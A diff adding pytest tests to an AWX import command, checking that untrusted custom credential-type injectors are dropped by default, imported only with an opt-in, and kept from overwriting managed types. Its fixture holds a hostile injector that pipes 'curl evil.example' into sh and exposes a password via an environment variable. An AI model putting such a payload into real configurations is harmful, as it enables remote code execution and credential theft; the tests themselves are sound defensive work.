@@ -319,3 +319,57 @@ def test_import_never_demotes_a_local_superuser(fake_awx):
     call_command('import_from_awx', url='https://awx.example.com', token='t')
     assert User.objects.get(username='alice').is_superuser
 
+
+
+# --- M2: custom credential-type injectors from the source are untrusted ---
+
+EVIL_INJECTORS = {'env': {'PAYLOAD': '{{ password }}'}, 'file': {'template': '#!/bin/sh\ncurl evil.example | sh'}}
+
+
+@pytest.fixture
+def source_injectors(monkeypatch):
+    ct = dict(AWX_DATA['credential_types'][0], injectors=EVIL_INJECTORS)
+    monkeypatch.setitem(AWX_DATA, 'credential_types', [ct])
+
+
+@pytest.mark.django_db
+def test_injectors_are_dropped_by_default(fake_awx, source_injectors):
+    call_command('import_from_awx', url='https://awx.example.com', token='t')
+    ct = CredentialType.objects.get(name='My Cloud')
+    assert ct.injectors == {}
+    # The credential itself still comes over and points at the type.
+    assert Credential.objects.get(name='cloud-cred').credential_type == ct
+
+
+@pytest.mark.django_db
+def test_injectors_are_imported_with_the_opt_in(fake_awx, source_injectors):
+    call_command('import_from_awx', url='https://awx.example.com', token='t', trust_injectors=True)
+    assert CredentialType.objects.get(name='My Cloud').injectors == EVIL_INJECTORS
+
+
+@pytest.mark.django_db
+def test_rerun_keeps_injectors_an_admin_re_approved(fake_awx, source_injectors):
+    call_command('import_from_awx', url='https://awx.example.com', token='t')
+    approved = {'env': {'MY_CLOUD_USER': '{{ username }}'}}
+    ct = CredentialType.objects.get(name='My Cloud')
+    ct.injectors = approved
+    ct.save()
+
+    call_command('import_from_awx', url='https://awx.example.com', token='t')
+    assert CredentialType.objects.get(name='My Cloud').injectors == approved
+
+
+@pytest.mark.django_db
+def test_managed_types_are_matched_not_overwritten(fake_awx, monkeypatch):
+    from forail.main.models.credential import ManagedCredentialType  # noqa: F401  (registers managed types)
+
+    CredentialType.setup_tower_managed_defaults()
+    machine = CredentialType.objects.get(managed=True, namespace='ssh')
+    before = machine.injectors
+    monkeypatch.setitem(
+        AWX_DATA, 'credential_types',
+        AWX_DATA['credential_types'] + [{'id': 31, 'name': machine.name, 'kind': 'ssh', 'managed': True, 'inputs': {}, 'injectors': EVIL_INJECTORS}],
+    )
+    call_command('import_from_awx', url='https://awx.example.com', token='t', trust_injectors=True)
+    machine.refresh_from_db()
+    assert machine.injectors == before
